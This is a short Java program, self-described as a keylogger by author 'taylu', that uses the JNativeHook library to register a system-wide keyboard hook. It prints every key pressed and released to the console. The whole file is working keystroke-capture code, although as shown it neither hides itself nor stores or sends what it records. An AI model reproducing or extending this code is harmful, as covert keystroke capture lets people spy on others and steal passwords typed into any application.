
/**
 * This is a keylogger. As long as it's running, it'll record the user's keystrokes.
 * @author taylu
 */
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Main implements NativeKeyListener {

	/**
	 * @param args
	 */
	public static void main(String[] args) {
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			e.printStackTrace();
		}

		GlobalScreen.getInstance().addNativeKeyListener(new Main());
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent ev) {
		System.out.println("Pressed " + NativeKeyEvent.getKeyText( ev.getKeyCode() ));
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent ev) {
		System.out.println("Released " + NativeKeyEvent.getKeyText( ev.getKeyCode() ));
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent ev) {
		
	}
}
